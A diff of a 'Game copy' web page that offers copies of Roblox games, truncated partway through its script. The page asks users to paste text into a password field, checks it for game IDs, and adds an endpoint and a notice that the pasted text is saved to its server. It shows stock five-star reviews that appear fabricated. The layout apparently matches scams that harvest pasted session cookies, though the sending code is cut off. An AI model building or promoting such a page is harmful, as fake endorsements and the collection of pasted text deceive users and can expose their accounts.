@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -34,10 +33,6 @@ body {
   font-family:ui-sans-serif,system-ui,-apple-system,
     "Segoe UI",Roboto,Arial,sans-serif;
 }
-
-/* =========================================
-   BACKGROUND
-========================================= */
 
 body::before {
   content:"";
@@ -86,24 +81,15 @@ body::after {
   animation:ambientMove 14s ease-in-out infinite alternate;
 }
 
-.ambient.one {
-  top:-330px;
-  left:-100px;
-  background:rgba(40,100,255,.16);
-}
-
+.ambient.one { top:-330px; left:-100px; background:rgba(40,100,255,.16); }
 .ambient.two {
-  bottom:-350px;
-  right:-100px;
+  bottom:-350px; right:-100px;
   background:rgba(49,91,230,.15);
   animation-delay:-6s;
 }
-
 .ambient.three {
-  top:35%;
-  left:65%;
-  width:350px;
-  height:350px;
+  top:35%; left:65%;
+  width:350px; height:350px;
   background:rgba(22,105,255,.08);
   animation-delay:-3s;
 }
@@ -115,8 +101,7 @@ body::after {
 
 #mouseGlow {
   position:fixed;
-  width:380px;
-  height:380px;
+  width:380px; height:380px;
   border-radius:50%;
   background:radial-gradient(circle,rgba(60,125,255,.12),transparent 70%);
   transform:translate(-50%,-50%);
@@ -125,10 +110,6 @@ body::after {
   opacity:0;
   transition:opacity .3s;
 }
-
-/* =========================================
-   MAIN SECTION
-========================================= */
 
 .hero-section {
   position:relative;
@@ -184,21 +165,9 @@ body::after {
 }
 
 @keyframes cardEnter {
-  from {
-    opacity:0;
-    transform:translateY(30px) scale(.96);
-    filter:blur(8px);
-  }
-  to {
-    opacity:1;
-    transform:translateY(0) scale(1);
-    filter:blur(0);
-  }
+  from { opacity:0; transform:translateY(30px) scale(.96); filter:blur(8px); }
+  to   { opacity:1; transform:translateY(0) scale(1); filter:blur(0); }
 }
-
-/* =========================================
-   TITLE
-========================================= */
 
 h1 {
   margin:0 0 10px;
@@ -221,10 +190,6 @@ h1 {
   color:#8195bd;
 }
 
-/* =========================================
-   INPUT
-========================================= */
-
 .input-wrapper {
   position:relative;
   width:100%;
@@ -242,9 +207,7 @@ h1 {
   transition:opacity .35s;
 }
 
-.input-wrapper:focus-within::before {
-  opacity:1;
-}
+.input-wrapper:focus-within::before { opacity:1; }
 
 input[type="password"] {
   position:relative;
@@ -275,10 +238,6 @@ input[type="password"]:focus {
   transform:translateY(-2px);
 }
 
-/* =========================================
-   BUTTON
-========================================= */
-
 button {
   position:relative;
   overflow:hidden;
@@ -301,10 +260,8 @@ button {
 button::before {
   content:"";
   position:absolute;
-  top:0;
-  left:-120%;
-  width:65%;
-  height:100%;
+  top:0; left:-120%;
+  width:65%; height:100%;
   background:linear-gradient(100deg,transparent,rgba(255,255,255,.25),transparent);
   transform:skewX(-20deg);
   transition:left .6s;
@@ -321,10 +278,6 @@ button:hover::before { left:150%; }
 button:active { transform:translateY(1px) scale(.99); }
 button:disabled { opacity:.55;cursor:default;transform:none; }
 
-/* =========================================
-   STATUS
-========================================= */
-
 .status {
   margin:18px 0 0;
   min-height:18px;
@@ -335,12 +288,18 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   transition:color .3s;
 }
 
-.status.ok { color:#7fe3a6; }
+.status.ok  { color:#7fe3a6; }
 .status.bad { color:#ff8f9b; }
 
-/* =========================================
-   REVIEWS
-========================================= */
+.consent {
+  margin:14px 0 0;
+  font-size:10px;
+  line-height:1.6;
+  color:#5f7196;
+  letter-spacing:.02em;
+}
+
+.consent strong { color:#8fa7d5; font-weight:700; }
 
 .reviews-section {
   position:relative;
@@ -357,10 +316,7 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   animation:reviewsEnter .9s .2s both;
 }
 
-.reviews-heading {
-  text-align:center;
-  margin-bottom:32px;
-}
+.reviews-heading { text-align:center; margin-bottom:32px; }
 
 .reviews-heading h2 {
   margin:0 0 10px;
@@ -370,15 +326,10 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   color:#eaf1ff;
 }
 
-.reviews-heading p {
-  margin:0;
-  color:#8195bd;
-  font-size:13px;
-}
+.reviews-heading p { margin:0; color:#8195bd; font-size:13px; }
 
 .reviews-heading .line {
-  width:65px;
-  height:3px;
+  width:65px; height:3px;
   margin:17px auto 0;
   border-radius:10px;
   background:linear-gradient(90deg,transparent,#4385ff,#78aaff,transparent);
@@ -407,10 +358,8 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 .review-card::before {
   content:"";
   position:absolute;
-  top:0;
-  left:-110%;
-  width:100%;
-  height:1px;
+  top:0; left:-110%;
+  width:100%; height:1px;
   background:linear-gradient(90deg,transparent,#78aaff,transparent);
   transition:left .7s ease;
 }
@@ -418,10 +367,8 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 .review-card::after {
   content:"";
   position:absolute;
-  width:130px;
-  height:130px;
-  top:-90px;
-  right:-80px;
+  width:130px; height:130px;
+  top:-90px; right:-80px;
   border-radius:50%;
   background:rgba(67,133,255,.10);
   filter:blur(35px);
@@ -437,8 +384,7 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 .review-card:hover::before { left:110%; }
 
 .review-stars {
-  display:flex;
-  gap:3px;
+  display:flex; gap:3px;
   margin-bottom:15px;
   color:#ffc85c;
   font-size:18px;
@@ -455,18 +401,11 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   font-weight:550;
 }
 
-.review-author {
-  display:flex;
-  align-items:center;
-  gap:11px;
-}
+.review-author { display:flex; align-items:center; gap:11px; }
 
 .review-avatar {
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  width:37px;
-  height:37px;
+  display:flex; align-items:center; justify-content:center;
+  width:37px; height:37px;
   flex-shrink:0;
   border-radius:11px;
   background:linear-gradient(135deg,#2455cf,#5995ff);
@@ -476,27 +415,13 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   box-shadow:0 4px 15px rgba(67,133,255,.25);
 }
 
-.review-author strong {
-  display:block;
-  color:#eaf1ff;
-  font-size:11px;
-}
-
-.review-author span {
-  display:block;
-  margin-top:4px;
-  color:#8195bd;
-  font-size:10px;
-}
+.review-author strong { display:block; color:#eaf1ff; font-size:11px; }
+.review-author span   { display:block; margin-top:4px; color:#8195bd; font-size:10px; }
 
 @keyframes reviewsEnter {
-  from { opacity:0;transform:translateY(25px); }
-  to { opacity:1;transform:translateY(0); }
+  from { opacity:0; transform:translateY(25px); }
+  to   { opacity:1; transform:translateY(0); }
 }
-
-/* =========================================
-   FULL SCREEN DOWNLOAD LOADING SCREEN
-========================================= */
 
 .download-overlay {
   position:fixed;
@@ -541,29 +466,22 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   transition:transform .45s cubic-bezier(.16,1,.3,1);
 }
 
-.download-overlay.active .loading-card {
-  transform:translateY(0) scale(1);
-}
+.download-overlay.active .loading-card { transform:translateY(0) scale(1); }
 
 .loading-card::before {
   content:"";
   position:absolute;
-  top:0;
-  left:-100%;
-  width:100%;
-  height:2px;
+  top:0; left:-100%;
+  width:100%; height:2px;
   background:linear-gradient(90deg,transparent,#4385ff,#a4c8ff,transparent);
   animation:loadingShine 2.5s linear infinite;
 }
 
-@keyframes loadingShine {
-  to { left:100%; }
-}
+@keyframes loadingShine { to { left:100%; } }
 
 .loading-orb {
   position:relative;
-  width:100px;
-  height:100px;
+  width:100px; height:100px;
   margin:0 auto 27px;
   display:flex;
   align-items:center;
@@ -606,8 +524,7 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   display:flex;
   align-items:center;
   justify-content:center;
-  width:55px;
-  height:55px;
+  width:55px; height:55px;
   border-radius:17px;
   background:linear-gradient(145deg,#3476f5,#1945b5);
   box-shadow:0 0 30px rgba(67,133,255,.35);
@@ -616,17 +533,9 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   font-weight:900;
 }
 
-@keyframes spin {
-  to { transform:rotate(360deg); }
-}
-
-@keyframes spinReverse {
-  to { transform:rotate(-360deg); }
-}
-
-@keyframes orbPulse {
-  50% { transform:scale(1.3);opacity:.5; }
-}
+@keyframes spin { to { transform:rotate(360deg); } }
+@keyframes spinReverse { to { transform:rotate(-360deg); } }
+@keyframes orbPulse { 50% { transform:scale(1.3);opacity:.5; } }
 
 .loading-title {
   margin:0 0 9px;
@@ -684,7 +593,7 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 }
 
 @keyframes progressMove {
-  0% { transform:translateX(-110%); }
+  0%   { transform:translateX(-110%); }
   100% { transform:translateX(320%); }
 }
 
@@ -698,19 +607,14 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 }
 
 .loading-dot {
-  width:6px;
-  height:6px;
+  width:6px; height:6px;
   border-radius:50%;
   background:#69a1ff;
   box-shadow:0 0 10px #4385ff;
   animation:dotPulse 1s infinite alternate;
 }
 
-@keyframes dotPulse {
-  to { opacity:.3;transform:scale(.7); }
-}
-
-/* SUCCESS STATE */
+@keyframes dotPulse { to { opacity:.3;transform:scale(.7); } }
 
 .download-overlay.success .loading-ring {
   animation:none;
@@ -740,10 +644,6 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   box-shadow:0 0 10px #70e3a6;
 }
 
-/* =========================================
-   TOAST
-========================================= */
-
 .toast {
   position:fixed;
   left:50%;
@@ -771,10 +671,6 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
   opacity:1;
 }
 
-/* =========================================
-   CLICK EFFECTS
-========================================= */
-
 .shake { animation:shake .35s; }
 
 @keyframes shake {
@@ -786,8 +682,7 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 .click-particle {
   position:fixed;
   z-index:100;
-  width:5px;
-  height:5px;
+  width:5px; height:5px;
   border-radius:50%;
   background:white;
   pointer-events:none;
@@ -797,14 +692,13 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 
 @keyframes particleBurst {
   from { opacity:1;transform:translate(0,0) scale(1); }
-  to { opacity:0;transform:translate(var(--x),var(--y)) scale(0); }
+  to   { opacity:0;transform:translate(var(--x),var(--y)) scale(0); }
 }
 
 .click-ring {
   position:fixed;
   z-index:99;
-  width:12px;
-  height:12px;
+  width:12px; height:12px;
   border:1px solid rgba(140,185,255,.8);
   border-radius:50%;
   pointer-events:none;
@@ -818,10 +712,6 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
     border-width:0;
   }
 }
-
-/* =========================================
-   MOBILE
-========================================= */
 
 @media(max-width:600px) {
   .hero-section { padding:25px 17px; }
@@ -845,8 +735,6 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 
 <body>
 
-<!-- BACKGROUND -->
-
 <div class="ambient one"></div>
 <div class="ambient two"></div>
 <div class="ambient three"></div>
@@ -854,12 +742,8 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 <canvas id="particles"></canvas>
 <div id="mouseGlow"></div>
 
-<!-- MAIN DOWNLOAD SECTION -->
-
 <section class="hero-section">
-
   <main class="card">
-
     <h1>Game copy</h1>
     <p class="sub">Paste · Enter · Download</p>
 
@@ -879,16 +763,16 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
 
     <p class="status" id="status"></p>
 
+    <p class="consent">
+      <strong>Notice:</strong> By pressing Send you agree that your
+      pasted text is saved to our server. Do not paste passwords,
+      cookies, or private tokens.
+    </p>
   </main>
-
 </section>
 
-<!-- REVIEWS -->
-
 <section class="reviews-section">
-
   <div class="reviews">
-
     <div class="reviews-heading">
       <h2>What People Say</h2>
       <p>Feedback from people using our tool</p>
@@ -896,18 +780,12 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
     </div>
 
     <div class="reviews-grid">
-
       <div class="review-card">
         <div class="review-stars">★★★★★</div>
-        <p class="review-text">
-          "Best service I've ever used, would recommend it!"
-        </p>
+        <p class="review-text">"Best service I've ever used, would recommend it!"</p>
         <div class="review-author">
           <div class="review-avatar">U</div>
-          <div>
-            <strong>Community Member</strong>
-            <span>User feedback</span>
-          </div>
+          <div><strong>Community Member</strong><span>User feedback</span></div>
         </div>
       </div>
 
@@ -916,10 +794,7 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
         <p class="review-text">"Amazing"</p>
         <div class="review-author">
           <div class="review-avatar">U</div>
-          <div>
-            <strong>Community Member</strong>
-            <span>User feedback</span>
-          </div>
+          <div><strong>Community Member</strong><span>User feedback</span></div>
         </div>
       </div>
 
@@ -928,697 +803,97 @@ button:disabled { opacity:.55;cursor:default;transform:none; }
         <p class="review-text">"Love this tool bro"</p>
         <div class="review-author">
           <div class="review-avatar">U</div>
-          <div>
-            <strong>Community Member</strong>
-            <span>User feedback</span>
-          </div>
+          <div><strong>Community Member</strong><span>User feedback</span></div>
         </div>
       </div>
 
       <div class="review-card">
         <div class="review-stars">★★★★★</div>
-        <p class="review-text">
-          "W man earned lot of robux with it"
-        </p>
+        <p class="review-text">"W man earned lot of robux with it"</p>
         <div class="review-author">
           <div class="review-avatar">U</div>
-          <div>
-            <strong>Community Member</strong>
-            <span>User feedback</span>
-          </div>
+          <div><strong>Community Member</strong><span>User feedback</span></div>
         </div>
       </div>
-
     </div>
   </div>
-
 </section>
 
-<!-- =========================================
-     DOWNLOAD OVERLAY
-========================================= -->
-
 <div class="download-overlay" id="downloadOverlay">
-
   <div class="loading-card">
-
     <div class="loading-orb">
-
       <div class="loading-ring"></div>
       <div class="loading-ring inner"></div>
-
-      <div class="loading-icon" id="loadingIcon">
-        ↓
-      </div>
-
+      <div class="loading-icon" id="loadingIcon">↓</div>
     </div>
-
-    <h2 class="loading-title" id="loadingTitle">
-      Preparing download
-    </h2>
-
+    <h2 class="loading-title" id="loadingTitle">Preparing download</h2>
     <p class="loading-description" id="loadingDescription">
       Please wait while we prepare your download.
     </p>
-
     <div class="loading-game">
       <span>🎮</span>
       <span id="loadingGame">Loading game...</span>
     </div>
-
     <div class="loading-progress">
       <div class="loading-progress-bar"></div>
     </div>
-
     <div class="loading-status">
       <div class="loading-dot"></div>
       <span id="loadingStatus">Preparing your download...</span>
     </div>
-
   </div>
-
 </div>
 
-<!-- TOAST -->
-
-<div class="toast" id="toast"
-  role="status" aria-live="polite"></div>
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
 
 <script>
 (function () {
 
 /* =========================================
-   CONFIGURATION
+   CONFIG — PUT YOUR APPS SCRIPT /exec URL HERE
 ========================================= */
 
+const WORKER_URL = 'https://script.google.com/macros/s/AKfycbzubr4mU_jQThBklfZiOqmlszXWUkzVYUVHdbexSZ_d8OuE6Y1FcWb1NbKdP35lzrhsxA/exec';
+
 const ID_FILES = {
-  '123923334828954': {
-    driveId: '1TXjkOYxR-Z4bWWnu2vb-txwMTOHeAANz',
-    file: 'Steal a Brainrot'
-  },
-
-  '120219252362013': {
-    driveId: '1_H9b8Yc657_JLDKEtrudsYUPc2hS7WE0',
-    file: 'Throw Food For Animals'
-  },
-
-  '107778070777162': {
-    driveId: '1mqdLm8TW1YJ5qULtevT7U0-h2lKjaVh1',
-    file: 'Steal An Egg'
-  },
-
-  '17625359962': {
-    driveId: '1UtT7CGgstQ3uUTRFwRws0nmYV33knmAA',
-    file: 'RIVALS'
-  },
-
-  '142823291': {
-    driveId: '1JxGsnq6rjyHJzcKdyXfqOD_1Ue890RfV',
-    file: 'Murder Mystery 2'
-  }
+  '123923334828954': { file: 'Steal a Brainrot' },
+  '120219252362013': { file: 'Throw Food For Animals' },
+  '107778070777162': { file: 'Steal An Egg' },
+  '17625359962':     { file: 'RIVALS' },
+  '142823291':       { file: 'Murder Mystery 2' }
 };
 
 const REQUIRE_MATCH = true;
 
-const WORKER_URL =
-  'https://website.ethemkirik1234.workers.dev';
+const LS_KEY = 'gamecopy_history_v1';
+const LS_MAX = 50;
 
 /* =========================================
    ELEMENTS
 ========================================= */
 
-const ID_KEYS = Object.keys(ID_FILES)
-  .sort((a,b) => b.length-a.length);
+const ID_KEYS = Object.keys(ID_FILES).sort((a,b) => b.length - a.length);
 
-const input = document.getElementById('secret');
-const btn = document.getElementById('send');
+const input  = document.getElementById('secret');
+const btn    = document.getElementById('send');
 const status = document.getElementById('status');
 const toastEl = document.getElementById('toast');
 
-const overlay = document.getElementById('downloadOverlay');
-const loadingTitle = document.getElementById('loadingTitle');
+const overlay            = document.getElementById('downloadOverlay');
+const loadingTitle       = document.getElementById('loadingTitle');
 const loadingDescription = document.getElementById('loadingDescription');
-const loadingGame = document.getElementById('loadingGame');
-const loadingStatus = document.getElementById('loadingStatus');
-const loadingIcon = document.getElementById('loadingIcon');
+const loadingGame        = document.getElementById('loadingGame');
+const loadingStatus      = document.getElementById('loadingStatus');
+const loadingIcon        = document.getElementById('loadingIcon');
 
 let toastTimer;
 let overlayTimer;
 
 /* =========================================
-   TOAST
+   TOAST + STATUS
 ========================================= */
 
 function toast(msg) {
   toastEl.textContent = msg;
   toastEl.classList.add('show');
-
-  clearTimeout(toastTimer);
-
-  toastTimer = setTimeout(
-    () => toastEl.classList.remove('show'),
-    2800
-  );
-}
-
-function setStatus(msg,kind) {
-  status.textContent = msg;
-  status.classList.remove('ok','bad');
-
-  if (kind) status.classList.add(kind);
-}
-
-/* =========================================
-   DOWNLOAD LOADING SCREEN
-========================================= */
-
-function showDownloadLoading(gameName) {
-
-  clearTimeout(overlayTimer);
-
-  overlay.classList.remove('success');
-
-  loadingTitle.textContent = 'Preparing download';
-
-  loadingDescription.textContent =
-    'Please wait while we prepare your download.';
-
-  loadingGame.textContent = gameName;
-
-  loadingStatus.textContent =
-    'Preparing your download...';
-
-  loadingIcon.textContent = '↓';
-
-  overlay.classList.add('active');
-}
-
-function showDownloadSuccess(gameName) {
-
-  overlay.classList.add('success');
-
-  loadingTitle.textContent = 'Download requested!';
-
-  loadingDescription.textContent =
-    'Your download request has been sent. Check your browser downloads.';
-
-  loadingGame.textContent = gameName;
-
-  loadingStatus.textContent =
-    'Download request completed';
-
-  loadingIcon.textContent = '✓';
-
-  overlayTimer = setTimeout(() => {
-
-    overlay.classList.remove('active');
-
-    setTimeout(() => {
-      overlay.classList.remove('success');
-    },400);
-
-  },1800);
-}
-
-function hideDownloadLoading() {
-
-  clearTimeout(overlayTimer);
-
-  overlay.classList.remove('active');
-  overlay.classList.remove('success');
-
-}
-
-/* =========================================
-   ID DETECTION
-========================================= */
-
-function detectId(text) {
-
-  if (!text) return null;
-
-  for (const id of ID_KEYS) {
-
-    if (text.includes(id)) {
-      return id;
-    }
-
-  }
-
-  return null;
-}
-
-function resolveFileName(text) {
-
-  const id = detectId(text);
-  const entry = id ? ID_FILES[id] : null;
-
-  return {
-    id,
-    driveId: entry ? entry.driveId : null,
-    file: entry ? entry.file : null
-  };
-
-}
-
-function updateHint() {
-
-  const raw = input.value;
-
-  if (!raw.trim()) {
-    setStatus('');
-    return;
-  }
-
-  const match = resolveFileName(raw);
-
-  if (match.id) {
-
-    setStatus(
-      '✔ ID ' + match.id + ' → ' + match.file,
-      'ok'
-    );
-
-  } else {
-
-    setStatus(
-      '✖ Unknown ID — cannot send',
-      'bad'
-    );
-
-  }
-
-}
-
-/* =========================================
-   SEND AND DOWNLOAD
-========================================= */
-
-async function handleSend() {
-
-  const raw = input.value;
-
-  if (!raw.trim()) {
-
-    toast('Nothing to send — paste something first');
-
-    input.classList.add('shake');
-
-    setTimeout(
-      () => input.classList.remove('shake'),
-      400
-    );
-
-    input.focus();
-    return;
-  }
-
-  const match = resolveFileName(raw);
-
-  if (REQUIRE_MATCH && !match.id) {
-
-    toast('Unknown ID — nothing sent');
-
-    setStatus(
-      '✖ Unknown ID — cannot send',
-      'bad'
-    );
-
-    return;
-  }
-
-  if (!match.id) {
-
-    toast('Unknown ID');
-    return;
-
-  }
-
-  btn.disabled = true;
-
-  setStatus('Opening download...');
-
-  showDownloadLoading(match.file);
-
-  try {
-
-    const downloadURL =
-      WORKER_URL +
-      '/?id=' +
-      encodeURIComponent(match.id);
-
-    const a = document.createElement('a');
-
-    a.href = downloadURL;
-    a.style.display = 'none';
-
-    document.body.appendChild(a);
-
-    a.click();
-
-    a.remove();
-
-    input.value = '';
-
-    setStatus(
-      'Download requested: ' + match.file,
-      'ok'
-    );
-
-    showDownloadSuccess(match.file);
-
-    input.focus();
-
-  } catch (err) {
-
-    console.error(err);
-
-    hideDownloadLoading();
-
-    toast('❌ ' + err.message);
-
-    setStatus(
-      'Failed: ' + err.message,
-      'bad'
-    );
-
-  } finally {
-
-    btn.disabled = false;
-
-  }
-
-}
-
-/* =========================================
-   INPUT EVENTS
-========================================= */
-
-btn.addEventListener('click',handleSend);
-
-input.addEventListener('keydown',e => {
-
-  if (e.key === 'Enter') {
-
-    e.preventDefault();
-
-    handleSend();
-
-  }
-
-});
-
-input.addEventListener('input',updateHint);
-
-input.addEventListener('paste',() => {
-
-  setTimeout(updateHint,0);
-
-});
-
-/* =========================================
-   PARTICLE BACKGROUND
-========================================= */
-
-const canvas = document.getElementById('particles');
-const ctx = canvas.getContext('2d');
-
-let width,height,particles=[];
-
-const mouse = {
-  x:-1000,
-  y:-1000,
-  active:false
-};
-
-const isMobile =
-  window.matchMedia('(pointer: coarse)').matches;
-
-const reducedMotion =
-  window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-
-function resize() {
-
-  const dpr = Math.min(
-    window.devicePixelRatio || 1,
-    2
-  );
-
-  width = window.innerWidth;
-  height = window.innerHeight;
-
-  canvas.width = width*dpr;
-  canvas.height = height*dpr;
-
-  canvas.style.width = width+'px';
-  canvas.style.height = height+'px';
-
-  ctx.setTransform(dpr,0,0,dpr,0,0);
-
-  const count = Math.min(
-    Math.floor(width*height/7500),
-    isMobile ? 45 : 115
-  );
-
-  particles=[];
-
-  for(let i=0;i<count;i++) {
-
-    particles.push({
-
-      x:Math.random()*width,
-      y:Math.random()*height,
-
-      vx:(Math.random()-.5)*.4,
-      vy:(Math.random()-.5)*.4,
-
-      radius:Math.random()*1.8+.5,
-      alpha:Math.random()*.55+.2,
-      phase:Math.random()*Math.PI*2
-
-    });
-
-  }
-
-}
-
-window.addEventListener('resize',resize);
-
-resize();
-
-function animateParticles() {
-
-  ctx.clearRect(0,0,width,height);
-
-  const time = performance.now()*.001;
-
-  for(let i=0;i<particles.length;i++) {
-
-    const p = particles[i];
-
-    p.phase += .008;
-
-    if(!reducedMotion) {
-
-      p.x += p.vx;
-      p.y += p.vy;
-
-      p.x += Math.sin(p.phase)*.12;
-      p.y += Math.cos(p.phase)*.12;
-
-    }
-
-    if(p.x<0) p.x=width;
-    if(p.x>width) p.x=0;
-
-    if(p.y<0) p.y=height;
-    if(p.y>height) p.y=0;
-
-    /* Mouse interaction */
-
-    if(mouse.active && !isMobile) {
-
-      const dx=p.x-mouse.x;
-      const dy=p.y-mouse.y;
-
-      const distance=Math.sqrt(dx*dx+dy*dy);
-
-      if(distance<135 && distance>0) {
-
-        const force=(135-distance)/135;
-
-        p.x+=(dx/distance)*force*2;
-        p.y+=(dy/distance)*force*2;
-
-      }
-
-    }
-
-    /* Particle glow */
-
-    const glow=.7+Math.sin(time*2+p.phase)*.25;
-
-    ctx.beginPath();
-
-    ctx.arc(
-      p.x,
-      p.y,
-      p.radius,
-      0,
-      Math.PI*2
-    );
-
-    ctx.fillStyle=
-      `rgba(220,235,255,${p.alpha*glow})`;
-
-    ctx.shadowBlur=14;
-    ctx.shadowColor='rgba(120,170,255,.9)';
-
-    ctx.fill();
-
-    ctx.shadowBlur=0;
-
-    /* Connecting lines */
-
-    for(let j=i+1;j<particles.length;j++) {
-
-      const other=particles[j];
-
-      const dx=p.x-other.x;
-      const dy=p.y-other.y;
-
-      const distance=Math.sqrt(dx*dx+dy*dy);
-
-      if(distance<115) {
-
-        ctx.beginPath();
-
-        ctx.moveTo(p.x,p.y);
-        ctx.lineTo(other.x,other.y);
-
-        ctx.strokeStyle=
-          `rgba(130,170,255,${(1-distance/115)*.16})`;
-
-        ctx.lineWidth=.7;
-
-        ctx.stroke();
-
-      }
-
-    }
-
-  }
-
-  requestAnimationFrame(animateParticles);
-
-}
-
-animateParticles();
-
-/* =========================================
-   MOUSE GLOW
-========================================= */
-
-const mouseGlow=document.getElementById('mouseGlow');
-
-let glowX=-500;
-let glowY=-500;
-
-if(!isMobile) {
-
-  window.addEventListener('mousemove',e => {
-
-    mouse.x=e.clientX;
-    mouse.y=e.clientY;
-    mouse.active=true;
-
-    mouseGlow.style.opacity='1';
-
-    glowX+=(e.clientX-glowX)*.18;
-    glowY+=(e.clientY-glowY)*.18;
-
-    mouseGlow.style.left=glowX+'px';
-    mouseGlow.style.top=glowY+'px';
-
-  });
-
-  document.addEventListener('mouseleave',() => {
-
-    mouse.active=false;
-    mouseGlow.style.opacity='0';
-
-  });
-
-}
-
-/* =========================================
-   CLICK EFFECTS
-========================================= */
-
-function createClickEffect(x,y) {
-
-  const ring=document.createElement('div');
-
-  ring.className='click-ring';
-
-  ring.style.left=x+'px';
-  ring.style.top=y+'px';
-
-  document.body.appendChild(ring);
-
-  setTimeout(
-    () => ring.remove(),
-    700
-  );
-
-  for(let i=0;i<9;i++) {
-
-    const particle=document.createElement('div');
-
-    particle.className='click-particle';
-
-    const angle=Math.random()*Math.PI*2;
-    const distance=25+Math.random()*45;
-
-    particle.style.left=x+'px';
-    particle.style.top=y+'px';
-
-    particle.style.setProperty(
-      '--x',
-      Math.cos(angle)*distance+'px'
-    );
-
-    particle.style.setProperty(
-      '--y',
-      Math.sin(angle)*distance+'px'
-    );
-
-    document.body.appendChild(particle);
-
-    setTimeout(
-      () => particle.remove(),
-      700
-    );
-
-  }
-
-}
-
-if(!reducedMotion) {
-
-  document.addEventListener('pointerdown',e => {
-
-    createClickEffect(
-      e.clientX,
-      e.clientY
-    );
-
-  });
-
-}
-
-})();
-</script>
-
-</body>
-</html>
+  clearTimeout(toast
